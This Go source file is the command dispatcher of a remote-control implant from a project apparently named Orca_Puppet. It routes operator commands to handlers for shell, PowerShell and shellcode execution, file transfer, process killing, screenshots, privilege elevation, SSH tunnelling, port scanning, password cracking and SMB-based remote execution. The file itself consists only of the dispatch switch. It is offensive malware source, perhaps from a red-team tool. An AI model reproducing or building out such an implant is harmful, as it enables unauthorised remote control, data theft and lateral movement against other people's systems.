package controller

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/cli/common/setchannel"
)

func Start() {
	for {
		select {
		case message := <-setchannel.CmdMsgChan:
			msg, sendUserId, decData := common.SettleRetData(message)
			switch msg {
			case "closeClient":
				go closeClientCmd()
				break
			case "execShell":
				go shellCmd(sendUserId, decData)
				break
			case "execPowershell":
				go powershellCmd(sendUserId, decData)
				break
			case "fileUpload":
				go fileUploadCmd(sendUserId, decData)
				break
			case "fileDownload":
				go fileDownloadCmd(sendUserId, decData)
				break
			case "processList":
				go processListCmd(sendUserId)
				break
			case "processKill":
				go processKillCmd(sendUserId, decData)
				break
			case "info":
				go infoCmd(sendUserId)
				break
			case "shellcode":
				go shellcodeCmd(sendUserId, decData)
				break
			case "plugin":
				go pluginCmd(sendUserId, decData)
				break
			case "screenshot":
				go screenCmd(sendUserId)
				break
			case "getAdmin":
				go getAdminCmd(sendUserId, decData)
				break
			case "proxyClientStart":
				go proxyClientStartCmd(sendUserId, decData)
				break
			case "proxyClientClose":
				go proxyClientCloseCmd(decData)
				break
			case "sshConnTest":
				go sshConnTestCmd(sendUserId, decData)
				break
			case "sshRun":
				go sshRunCmd(sendUserId, decData)
				break
			case "sshUpload":
				go sshUploadCmd(sendUserId, decData)
				break
			case "sshDownload":
				go sshDownloadCmd(sendUserId, decData)
				break
			case "sshTunnelStart":
				go sshTunnelStartCmd(sendUserId, decData)
				break
			case "sshTunnelClose":
				go sshTunnelCloseCmd(decData)
				break
			case "portScan":
				go portScanCmd(sendUserId, decData)
				break
			case "portCrack":
				go portCrackCmd(sendUserId, decData)
				break
			case "smbUpload":
				go smbUploadCmd(sendUserId, decData)
				break
			case "smbExec":
				go smbExecCmd(sendUserId, decData)
				break

			default:
				break
			}
		}
	}
}
